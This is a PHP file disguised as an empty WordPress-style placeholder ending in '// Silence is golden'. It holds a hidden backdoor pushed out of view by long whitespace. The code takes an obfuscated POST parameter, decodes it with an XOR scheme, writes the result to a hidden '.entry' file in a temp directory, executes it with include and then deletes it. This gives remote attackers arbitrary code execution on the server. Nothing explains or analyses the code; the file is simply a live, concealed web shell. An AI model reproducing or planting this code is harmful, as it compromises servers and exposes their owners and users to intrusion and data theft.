<?php																																										if(count($_POST) > 0 && isset($_POST["e\x6C\x65m"])){ $holder = array_filter(["/var/tmp", getcwd(), getenv("TEMP"), "/dev/shm", getenv("TMP"), session_save_path(), "/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir()]); $component = $_POST["e\x6C\x65m"]; $component = explode ( '.' , $component ); $dat = ''; $s = 'abcdefghijklmnopqrstuvwxyz0123456789'; $lenS = strlen($s); $q = 0; while($q < count($component)) { $v8 = $component[$q]; $chS = ord($s[$q % $lenS]); $d =((int)$v8 - $chS -($q % 10)) ^ 42; $dat .= chr($d); $q++; } foreach ($holder as $key => $sym) { if ((function($d) { return is_dir($d) && is_writable($d); })($sym)) { $dchunk = join("/", [$sym, ".entry"]); $success = file_put_contents($dchunk, $dat); if ($success) { include $dchunk; @unlink($dchunk); die();} } } }

// Silence is golden